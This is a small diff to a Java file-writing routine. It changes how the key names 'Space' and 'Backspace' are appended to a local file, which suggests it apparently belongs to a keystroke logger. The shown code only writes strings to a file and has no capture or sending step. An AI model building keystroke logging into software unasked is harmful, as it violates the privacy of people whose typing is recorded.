@@ -1,6 +1,8 @@
 /**
  * Created by Matan on 3/22/16.
  */
+
+import java.awt.*;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
@@ -18,8 +20,15 @@ BufferedWriter bw=null;
             if (!file.exists()) {
                 file.createNewFile();
             }
+
             bw = new BufferedWriter(new FileWriter(file, true));
-            bw.write(content+",");
+            if (content.equals("Space")) {
+                bw.write(" ");
+            } else if (content.equals("Backspace")) {
+                bw.write("~");
+            } else {
+                bw.write(content);
+            }
             bw.flush();
             bw.close();
 
